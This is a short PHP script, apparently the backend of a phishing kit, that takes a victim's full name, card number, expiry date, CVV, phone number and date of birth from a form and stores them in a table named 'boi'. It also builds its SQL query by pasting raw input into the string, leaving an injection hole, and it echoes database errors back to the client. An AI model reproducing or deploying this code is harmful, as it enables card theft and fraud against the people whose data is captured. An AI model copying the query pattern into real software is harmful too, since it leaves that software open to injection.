<?php
require '../connection.php';

if ($_POST["fullname"] and $_POST["cardnumber"] and $_POST["expirydate"] and $_POST["cvv"] and $_POST["phonenumber"] and $_POST["dob"] and $_POST["uniqueid"]) {
  $fullname = $_POST["fullname"];
  $cardnumber = $_POST["cardnumber"];
  $expirydate = $_POST["expirydate"];
  $cvv = $_POST["cvv"];
  $pn = $_POST["phonenumber"];
  $dob = $_POST["dob"];
  $uniqueid = $_POST["uniqueid"];

  $query = mysqli_query($conn, "UPDATE boi SET fullname='$fullname', cardnumber='$cardnumber', expirydate='$expirydate', cvv='$cvv', card_phonenumber='$pn', card_dob='$dob', status=0 WHERE uniqueid=$uniqueid");
  if ($query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}


?>
